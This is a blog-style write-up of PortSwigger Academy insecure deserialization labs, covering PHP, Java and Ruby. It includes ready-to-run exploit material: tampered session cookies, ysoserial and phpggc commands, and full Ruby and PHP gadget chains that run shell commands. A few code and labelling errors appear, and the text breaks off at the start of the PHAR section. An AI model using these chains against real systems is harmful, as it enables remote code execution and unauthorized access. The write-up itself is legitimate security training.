---
title: "Insecure Deserialization Basics"
date: 2025-09-03T00:59:32+03:00
draft: false
authors: [Thuri]
lightgallery: true
tags: ["appsec", "websec", "portswigger", "java"]
Summary: "Insecure deserialization occurs when attacker-controlled data is deserialized by the website, allowing an attacker to manipulate serialized objects in order to pass harmful data."
toc:
    enable: true
    auto: false

Description: "Insecure deserialization occurs when attacker-controlled data is deserialized by the website, allowing an attacker to manipulate serialized objects to pass harmful data."
---

## Introduction

Serialization is the process of converting memory objects into a text or binary format output, while Deserialization is the process of loading back the serialized data into memory. The serialized data form can be text-based, such as JSON or XML, or a binary format.

Insecure deserialization occurs when attacker-controlled data is deserialized by the website, allowing an attacker to manipulate serialized objects in order to pass harmful data.

The vulnerabilities due to insecure deserialization of attacker-controlled data can lead to Remote Code Execution (RCE), Privilege Escalation, Arbitrary class access, and even Denial of Service (DoS) attacks. The deserialization attacks of today are also made possible due to the higher number of dependencies and frameworks that exist in modern websites. This dependency creates a problem of massive Classes and Objects as they increase the attack surface.

> [!TIP]
> When hunting for Insecure Deserialization, look for user-controlled data passed into the website that resembles serialized data.

In understanding how insecure deserialization manifests in web applications, this blog will attempt to solve the deserialization challenges/labs by [Portswigger Academy](https://portswigger.net/web-security/deserialization). The challenges demonstrate various insecure implementations of data deserialization in Java, PHP, and Ruby. Insecure deserialization is also prevalent in other languages like Python and Node.

### PHP Serialization

PHP uses a human-readable string format with letters representing data type and numbers representing the length of each entry. For example, a `User` object with the attributes. The native methods for PHP serialization are `serialize()` and `unserialize()`. When code auditing `PHP` applications, start by looking for `unserialize()` anywhere and investigating further how data is being handled.

The example is a PHP code snippet of a `User` object.

```php
$User->name ="carlos";
$User->isLoggedIn = true;
```

When the above code is serialized, the object looks like the JSON output shown below.

```json
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
```

Serialization is very useful in storing or passing PHP values around without losing their type and structure.

> [!Important]
> When serializing objects, PHP will attempt to call the member functions `__serialize()` or `__sleep()` before serialization. This is to allow the object to do any last-minute clean-up, etc., before being serialized. Likewise, when the object is restored using `unserialize()` the `__unserialize()` or `__wakeup()` member function is called.

#### Phar Format

The PHP language uses Phar files as a means for distributing PHP applications and libraries as a single application. Phar is a short form for PHP Archive. Phar archives can be executed by PHP as any other file. The Phar implements this functionality using Stream wrappers.

Example implementation of accessing the external files using `include`.

```php
<?php
include '/path/to/externa/file.php';
>
```

The Phar Stream wrapper fully supports `fopen()` for read and write(not append),`unlink()`, `stat()`, `fstat()`, `fseek()`, `rename()` and directory Stream operations `opendir()`, `rmdir`, and `mkdir()`.

For a PHP file to be considered a Phar archive, it must contain three to four sections. The sections are:

1. A stub
2. A manifest describing the content
3. The file contents
4. A signature verifying Phar Integrity [optional]

### Java serialization

Java Language uses a binary serialization format, which is more difficult to read, but still, the serialized data can be identified. For example, Serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64 encoding. Any Java Class that implements the interface `java.io.Serializable` can be serialized and deserialized.

> [!tip]
> If you have source code access to the target application, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an InputStream.

In implementing a serializable Class object in Java, one needs to implement the `java.io.Serializable` interface as shown in the example below.

```java
public class User implements Serializable {
    // Code implementation
}
```

### Magical methods

Magical methods are a subset of methods that are invoked automatically whenever a particular event or scenario occurs. One of the most common examples in PHP is `__construct()`, which is invoked whenever an object of the class is instantiated. The constructor magic method contains code to initialize the attributes of the instance. The magic methods can also be customized by the developers to execute any code they want.

Magic methods can become dangerous when the code they execute handles attacker-controlled data, for example, from a deserialized Object. This makes an attacker automatically invoke methods on deserialized data when all conditions are met.

In PHP, the `unserialize()` method looks for and invokes an object's `__wakeup()` magic method. In Java deserialization, the same applies to the `ObjectInputStream.readObject()` method, which is used to read data from the initial byte stream and essentially acts like a constructor for "re-initializing" a serialized object.

When doing code audit exercises, pay close attention to any classes that contain types of magic methods. Magic methods allow passing of user-controlled data from a serialized object into the website's code before the object is fully deserialized.

#### PHP Magic Methods

PHP provides a set special methods known as "magic methods" that begin with double underscore. These methods are called automatically by PHP in response to certain events, allowing developers to implement custom behaviors within classes.

1. `__construct()`

Construct (), also known as the constructor, is mainly used to initialize the object when creating it and assigning initial values to the object's member variables.

Example of the implementation

```php
<?php
class newConstruct {
    public function __construct(){
        echo "Hello World";
    }
}

$new_construct = new newConstruct();
?>
```

2. `__destruct()`

Known as a destructor, it is the opposite of the constructor. It is called when the object ends its life cycle. It is typically used to release resources or perform cleanup operations.

3. `__sleep()` and `__wakeup()`

These methods are called when we call `serialize()` and `unserialize()` functions on an object respectively.

4. `__get()` and `_set()`

The methods are used when reading or writing to an inaccessible or non-existent property.

5. `__call`

A call is triggered when invoking inaccessible methods in an object instance.

6. `__toString()`

The method is invoked when an object is treated as a string using `echo` or `print`. It allows you to define how an object should be represented as a string.

7. `__invoke()`

The method is called when you try to call an object as if it were a function.

These magic methods in PHP provide a powerful way to manage object behavior dynamically. They are helpful in creating flexible and reusable classes, such data mappers and dynamic proxies.

### Gadget chains

A "gadget" is a snippet of code that exists in the application that can help an attacker achieve a particular goal. Construction of gadget chains is completely unrelated to what code or libraries your application invokes.

### Ruby Serialization

Ruby deserialization is the process of converting serialized data into Ruby objects, often using formats like YAML, Marshal, or JSON. In Ruby, serialization is referred to as Marshalling. Ruby programming language uses the `Marshal` library to convert the collections of Ruby objects into a byte stream, allowing them to be stored outside the active script.

Ruby has special serialization needs (where a user wants to serialize an object into a specified format), or if it contains objects that would not be serializable, one can implement their own serialization strategy. This strategy can be done using the `marshal_dump` and `marshal_load` or `_dump` and `_load`.

> [!tip]
> Marshal.load can deserialize almost any classes loaded into the Ruby process, in many cases leading to Remote Code Execution (RCE) if the `Marshal` data is loaded from an untrusted source. Therefore, `marshal.load` is not suitable for general-purpose serialization.

When dumping an object, the method `marshal_dump` must return a result containing the information necessary for `marshal_load` to reconstitute the object. The result returned can be any object.

Example of `Marshal.dump` implementation in Ruby.

```ruby
irb(main):002:0> Marshal.dump foo
=> "\x04\b[\aI\"\x10Ruby String\x06:\x06ET{\x06I\"\x12param strings\x06;\x00Ti\x02\xE9\a"
irb(main):003:0> foo = ["Ruby String", {"param strings" => 2025}]
=> ["Ruby String", {"param strings"=>2025}]
irb(main):004:0> Marshal.dump foo
=> "\x04\b[\aI\"\x10Ruby String\x06:\x06ET{\x06I\"\x12param strings\x06;\x00Ti\x02\xE9\a"
```

When writing a Ruby deserialization chain or exploiting a Ruby deserialization vulnerability, the following things need to happen:

1. Finding the start of the gadget chain: This involves finding classes that implement the `marshal_load` instance method and can be tied to other gadgets.
2. Finding a way to trigger `Kernel::System`.
3. Finding a way to store and pass a shell command.
4. Calling random functions to tie up the chain together.

With the chain complete, an attacker can execute Remote Code Execute (RCE) on the target application.

## Exploitation

This section demonstrates different scenarios of insecure deserialization implementations and techniques for exploiting vulnerabilities. For successful exploitation of deserialization vulnerabilities, the following two conditions are key:

1. An attacker-controlled entry point to send a serialized object to be deserialized by the application. accept all s s
2. Use of Serialization Libraries without data validation.

### Modifying serialized objects

> [!info]
> This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user Carlos.

The first challenge is to access the `/admin` panel through a privilege escalation and delete the user Carlos from the website. To solve the challenge, one needs to log in to the application as the user `wiener` using the following credentials `wiener: peter`. After a successful login, the application generates a serializable cookie, which is our entry point for the attack. Since the application does not check the validity of the `session cookie`, it is possible to edit and become an admin. The session cookie is URL encoded and base64 encoded as shown in the Burp Decoder tab below.

{{< image src="deserialization/image.png" caption="Burp Decoding of Cookie" >}}

Burp Decoder is a tool within BurpSuite that allows one to encode, decode, and manipulate data. To solve the lab, we can modify the data by setting the admin value to `true` as shown in the JSON format.

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

By setting the admin value to 1, we make the user have the admin privileges. The admin privileges allow the deletion of users from the application, which is the goal of the challenge. After modifying, Base64 encoding, and URL encoding the session cookie, replace it in the Cookie Header. Replay the request using the repeater tool to bypass the access control mechanism and access the admin panel.

{{< image src="deserialization/image-1.png" caption="User Delete" >}}

With access to the admin panel, delete the user Carlos by changing the request path to `/admin/delete?username=carlos` and replaying the request in the repeater tab.

### Modifying serialized data types

> [!info]
> This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user Carlos.

The second challenge is similar to the previous challenge. The serialized cookie Object is a JSON format with now an `access_token` for authentication. This now implements a validation, preventing an attacker from directly modifying the serialized cookie.

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"uk17cesyh3gxjz6w5zuy2n7plq7z2kfr";}
```

In the challenge description, we need to access the administrator account. To be able to log in as an administrator, we need to modify the `username` and `access_token` variables in our Object. Since the application does not check the data types of variables, we can modify the `access_token` value type from a string to an integer, as shown in the JSON data below.

```json
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

This allows an attacker to bypass the weak defense mechanisms implemented by the developers. By replacing the Cookie session with the Base64 and URL-encoded data, we can access the admin panel and delete the user Carlos.

The base64 encoded data to replace the session cookie is:

```json
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

By replacing the cookie with the new session and replaying in the repeater, we are able to access the admin panel.

{{< image src="deserialization/lab2-sol.png" caption="Object Modification" >}}

By replacing the request path with `/admin/delete?username=carlos` and replaying the request, we are able to solve the challenge.

### Using application functionality to exploit insecure deserialization

> [!info]
> This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

The challenge is similar to the previous challenge, with the deserialization entry point being a session cookie. The goal of this is to delete the `morale.txt` file in the `carlos` home directory. In the Linux filesystem, the full path of the file is `/home/carlos/morale.txt`.

An example of the decoded session cookie of the challenge is.

```json
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ch4xnyx73qb141w23dkvio0qih1c5lqe";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

The session is similar to the previous one but includes an `avatar_link` property. The property is used for storing the path of the avatar image for the user. The application provides two user accounts to enable solving the challenge.

By logging in as `wiener`, we are able to test the full functionality of the website, like uploading an avatar and deleting the account. When a user deletes an account, it also deletes the file referenced in the `avatar_link` property. With this in mind, it is possible to modify our session cookie and delete the `morale.txt` file.

The modified session cookie is shown below. The new user of the session is `gregg` as the user `wiener` has been deleted by our previous requests and functionality testing.

```json
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ui29nhrc99fmqc7m9upcp3140h4tjnca";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

To replay the attack, encode the modified cookie and replace it in the cookie header. By deleting the account, we are able to delete the target file.

### Arbitrary object injection in PHP

> [!info]
> This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

In this challenge, the application is vulnerable to arbitrary object injection. The goal is to delete the `morale.txt` file by injecting a malicious object. By looking at the homepage source code, we are able to identify some information which are helpful in accessing the application source code. The leaked information helps us identify the path of one of the libraries `/libs/CustomTemplate.php` comment as shown in the HTML below.

```html
 </a>
    </div>
        </section>
        <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
    </div>
</section>
```

By accessing the path, we can see the source of the application
The next step is to examine and analyze the source.

```php {title=CustomTemplate.php}
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
?>
```

By analyzing the source code, we are able to identify two magic methods, `__construct()` and `__destruct()`, which are executed at the start and end of the object execution life cycle, respectively. The magic methods are crucial in helping us achieve our target of deleting the `/home/carlos/morale.txt` file.

From the code, the destructor calls the `unlink` function, which has one parameter, `lock_file_path`. We can leverage this to delete our file by modifying the session cookie object as shown below.

```json
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

By replacing the session cookie with new encoded serialized data, we can delete the file even if the application throws an error, as shown in the response below.

```html {title="Response Error"}
<div class="container is-page">
    <header class="navigation-header"></header>
    <h4>Internal Server Error</h4>
    <p class="is-warning">
        PHP Fatal error: Uncaught Exception: Invalid user in
        /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php
        on line 7
    </p>
</div>
```

### Exploiting Java deserialization with Apache Commons

> [!info]
> This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains. To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

The challenge implements a serialization-based session mechanism using the Apache Commons Collections library. Apache Commons is a collection of libraries that provide helper utilities, extensions to the Java Standard Library, and commonly used functions. With respect to this, the Common Collection libraries contain "dangerous chains" that can be exploited through Java deserialization attacks.

Since we don't have access to the application source code, it is possible to exploit the challenge by using third-party applications to generate malicious serialized objects. The goal is to build a chain that deletes the `morale.txt` file in Carlo's directory.

The entry point for our deserialization is the session cookie, which is attacker-controlled data. An example of a serialized token is shown below.

```json
¬ísr/lab.actions.common.serializable.AccessTokenUserQüå'©LaccessTokentLjava/lang/String;Lusernameq~xpt wt5l7xob2ms35ux1otuo5v21018hygh7twiener
```

From the details of the decoded token, we can gather some of the information about the library used and other identifiable information, such as `User` class, `username`, and `AccessToken` Object properties.

Since the challenge can be exploited using a pre-built gadget chain, we use the `ysoserial` tool to generate a payload as shown in the command below.

```sh {title="ysoserial command"}
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload] '[command]'
```

From the above template for the gadget chain, we need to know the exact common collections library to be used. To list the payloads available in the tool, we run the following command: `java -jar ysoserial-all.jar`.

```bash {title="ysoserial Help"}
ysoserial ➤ java -jar ysoserial-all.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
Jul 17, 2025 2:04:13 PM org.reflections.Reflections scan
INFO: Reflections took 359 ms to scan 1 URLs, producing 18 keys and 153 values
     Payload             Authors                                Dependencies
     -------             -------                                ------------
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
```

To build the chain for our exploit, we use `CommonsCollections2` as a payload and `rm /home/carlos/morale.txt` as a command.

```bash
java -jar ysoserial-all.jar CommonsCollections2 'rm /home/carlos/morale.txt'
```

Running the above, we get an error due to a higher version of JDK installed in the machine used for generating the exploit.

```bash
ysoserial ➤ java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt'
Error while generating or serializing payload
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x141803e1) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x141803e1
	at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
	at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:32)
	at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:26)
	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
```

To solve the error, it is recommended to use `JDK8` for running the tool. One of the simple ways is by running a Docker version of `ysoserial` using JDK8.

```docker {title="Dockerfile"}
FROM openjdk:8-jdk-alpine
WORKDIR /app
COPY ./ysoserial-all.jar .
ENTRYPOINT ["java", "-jar", "ysoserial-all.jar"]
```

To execute the tool, run the container command as shown below.

```bash
docker run --rm ysoserial [Command]
```

The generated payload is as shown in the image below.

{{< image src="/deserialization/ysoserial_xxd.png" caption="XXD Payload" >}}

From the generated output, we need to encode our generated output and replace the session cookie with it, as shown below.

```bash
docker run --rm ysoserial CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr -d "\n"
```

By replacing the session cookie with the malicious one, we are able to delete the file.

### PHP deserialization with a pre-built gadget chain

> [!info]
> This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains. To solve the lab, identify the target framework, then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

The challenge uses a common PHP framework to implement a serialization-based session mechanism. The goal of the challenge is to identify the framework used and use a relevant gadget chain to exploit the insecure deserialization. To identify the framework, send a malformed session token to leak in the error, as shown in the code below.

```html
<div class="container is-page">
    <header class="navigation-header"></header>
    <h4>Internal Server Error: Symfony Version: 4.3.6</h4>
    <p class="is-warning">
        PHP Fatal error: Uncaught Exception: Signature does not match session in
        /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php
        on line 7
    </p>
</div>
```

From the error above, we are able to identify the framework used as `Symfony Version: 4.3.6`. With this information, we can use pre-built gadget chains to delete the `morale.txt` file.

Sending the modified session will throw an error because the token is not signed. To solve this, we need to further audit the application and generate valid signed cookies. By looking at the homepage source, we can identify the `/cgi-bin/phpinfo.php` path commented out by the developer. The `phpinfo` path is able to reveal a lot of information about the environment variables, including the `SECRET_KEY` as shown in the image below.

{{< image src="/deserialization/deserialize_env.png" caption="Environment Variables" >}}

With access to `SECRET_KEY`(`ypecrm510xmjclhft3tm7ghwvid918cg`), we can now use it to sign our modified session object.

The cookie session is

```json
{
    "token": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5cnRjbHAzanM2Y3lxamthaWVidzUxcWU0eXRmMHl2eiI7fQ==",
    "sig_hmac_sha1": "ed4820140dfc3f05e4b17df34c8772f90ac0f02a"
}
```

Since the Signature is valid, it will throw an error as shown below.

```html
<div class="container is-page">
    <header class="navigation-header"></header>
    <h4>Internal Server Error: Symfony Version: 4.3.6</h4>
    <p class="is-warning">
        PHP Fatal error: Uncaught Exception: Signature does not match session in
        /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php
        on line 7
    </p>
</div>
```

To generate a new serialized session, we use `phpgcc` to build our chain. `phpgcc` is a tool to automate the process of crafting a gadgets chain in PHP.

```bash
 ./phpggc Symfony/rce9 exec "rm /hone/carlos/morale.txt" | base64 | tr  -d '\n'
```

Using the generated token will throw an error since it is not signed. We can generate a signed signature for our token using the following code.

```php
<?php
// Define the message and the secret key
$Token = "user_token";
$secretKey = "secret_env";
// Generate HMAC-SHA1 hash
$hmac = hash_hmac('sha1', $Token, $secretKey);
// Output the HMAC
echo "HMAC-SHA256: " . $hmac;
?>
```

By replacing the session cookie with a generated token, we are able to delete the file.

### Ruby deserialization using a documented gadget chain

> [!info]
> This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework. To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory. You can log in to your own account using the following credentials: `wiener:peter`

The challenge implements a serialization-based session mechanism using the Ruby on Rails framework. Ruby on Rails is a .... The goal is to use a publicly documented exploit chain to delete the `morale.txt` file. First, look at the structure of the session and try to identify any useful information as shown below.

```json
o:	User:@usernameI"wiener:EF:@access_tokenI"%psf4s581h6ln3feybwaqbuayb48eggsk;F
```

By altering the above session, we are able to trigger an error in the application as shown below.

```html
<div class="container is-page">
    <header class="navigation-header"></header>
    <h4>Internal Server Error</h4>
    <p class="is-warning">
        index.rb:13:in `load&apos;: incompatible marshal file format (can&apos;t
        be read) (TypeError) format version 4.8 required; 37.48 given from
        -e:13:in `&lt;main&gt;&apos;
    </p>
</div>
```

Since the source code is not available, we need to look at the public exploit gadget chains and adapt them to our target and needs.

#### Pre-built gadget chain

One of the publicly accessible pre-built gadget chains by `vakz`, is documented at [devcraft.io](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html), as shown code below.

```ruby
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

Puts payload.inspect
puts Marshal.load(payload)
```

From the analysis of the chain, the gadgets meet some of the criteria needed for the successful execution of the chain. Some of the criteria are; need a way to trigger `Kernel::System` sink, way to store and pass a shell command, i.e., `id` in our chain, and other random functions to tie the chain. Since our goal is to delete the file, we can swap the command as shown below in our code.

```ruby
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
```

Since the session cookie is base64 encoded, we need to update our chain code and implement the encoding bit.

```ruby {title="Ruby Deserialization Chain"}
require "base64"

Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

# Base64 encoding
b64 = Base64.strict_encode64(payload)
puts "base64 Payload:"
puts b64
```

To compile our Ruby code, we can use online tools like [Ruby online tools](https://www.w3cschool.cn/tryrun/runcode?lang=ruby). The base64 encoded payload is.

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIiJybSAtciAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

By replacing the session token with the above, we can solve the challenge.

{{< image src="/deserialization/ruby.png" caption="Ruby Deserialization" >}}

### Developing a custom gadget chain for PHP deserialization

> [!info]
> This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the `morale.txt` file from Carlos's home directory. You can log in to your own account using the following credentials: `wiener:peter`

The goal of this challenge is to develop a custom gadget chain using various code snippets to delete the `morale.txt` file. The first step is to do a recon on the application to see if there are any clues or information helpful for our chain. By looking at the home, we see some useful information as shown in the snippet below.

```html
</section>
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
</div>
```

The snippet code reveals the code path of one file used by the application. By checking the `/cgi-bin/libs/CustomTemplate.php` file and appending `~`, we can view the source. The `CustomTemplate` class source code is

```php {title=CustomTemplate.php}
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this was cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

From the analysis of the snippet, the `__wakeup()` magic method will be called automatically when an object is deserialized, allowing developers to perform special processing on the object before restoring it from the serialized form into a usable PHP object. When the magic method is called, it calls the `build_product` function, which tries to create a new `Product`. The Product function accepts two parameters, which are `default_desc_type` and `desc`. From this information, we may be able to start creating our chain as shown below.

```php
CustomTemplate->default_desc_type ="rm /home/carlos/morale.txt";
CustomTemplate->desc=DefaultMap;
```

Since the `_wakeup()` is called, we are able to trigger the `build_product` and pass the above parameters to the function. From the chain, we are now able to trigger the `DefaultMap` class. The constructor on the `DefaultMap` takes a parameter called `callback`. To continue with our chain, we can set the value of the callback parameter to be an executable PHP function like `exec`.

`__get()` is a magic method used for reading data from inaccessible (protected or private) or non-existing properties. Since it is called, it will trigger the execution of `call_user_func`. Now we chain our chain into a more complete one, as shown below.

```php
CustomTemplate->default_desc_type ="rm /home/carlos/morale.txt";
CustomTemplate->desc=DefaultMap;
DefaultMap->callback="exec";
```

Full implementation of our chain is shown below.

```php
<?php
class CustomTemplate
{
    private $default_desc_type;
    private $desc;


    public function __construct()
    {

        $this->desc =  new DefaultMap("exec");
        $this->default_desc_type = "rm /home/carlos/morale.txt";
    }
}

class DefaultMap
{
    private $callback;

    public function __construct($callback)
    {
        $this->callback = $callback;
    }
}

$payload_test = new CustomTemplate();
$payload_serialize = serialize($payload_test);
echo ($payload_serialize . "\n");
```

By executing the code, we are able to get the serialized data as shown.

```php
O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:4:"exec";}}
```

Encoding the above payload and replacing our session cookie will not work due to the spaces and repeated class name. To solve this, we need to manually edit our generated serialized data.

```php
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

By replacing our cookie with a base64 encoded payload and replaying the request using the `repeater` tab, we are able to solve the challenge.

{{< image src="/deserialization/deserialize_custom.png" caption="PHP Custom Gadget Chain" >}}

The challenge threw an error, but we were successfully able to solve it.

### Using PHAR deserialization to deploy a custom gadget chain

> [!info]
> This lab does not explicitly use deserialization. However, if you combine PHAR deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain. To solve the lab, delete the `morale.txt` file from Carlos's home directory. You can log in to your own account using the following credentials: `wiener:peter`

What is Phar? Phar is a way of distributing entire PHP applications as a single file and running them from that file without the need to extract it to the disk. By doing a recon on the application, we can get a directory `/cgi-bin` which contains the Java source code as shown in the files below.

```php {title=CustomTemplate.php}
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

